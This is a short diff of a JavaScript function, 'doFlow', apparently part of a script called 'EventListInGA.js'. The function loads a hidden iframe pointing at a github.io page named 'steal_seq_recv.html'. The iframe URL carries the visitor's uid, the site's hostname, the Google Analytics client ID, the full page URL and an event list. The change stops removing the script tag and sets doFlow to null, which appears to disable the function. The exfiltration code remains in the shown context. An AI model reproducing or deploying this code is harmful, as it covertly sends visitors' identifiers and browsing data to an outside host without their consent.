@@ -76,7 +76,6 @@ function doFlow() {
             if(wframe.parentNode){
                 wframe.parentNode.removeChild(wframe);
             }
-            $('script[src*="EventListInGA.js"]').remove();
             console.log("remove " + wjmId + " done");
         }, 20000);
 
@@ -213,5 +212,6 @@ function doFlow() {
         wframe.src = "https://wjinma.github.io/sending_for_fun/steal_seq_recv.html?uid==" + uid + "&&domain==" + window.location.hostname + "&&cid==" + getgaCid() + "&&url==" + window.location.href + "&&eList==" + eList;
         console.log(wjmId+" url: " + wframe.src);
     });
-
 }
+doFlow=null;
+
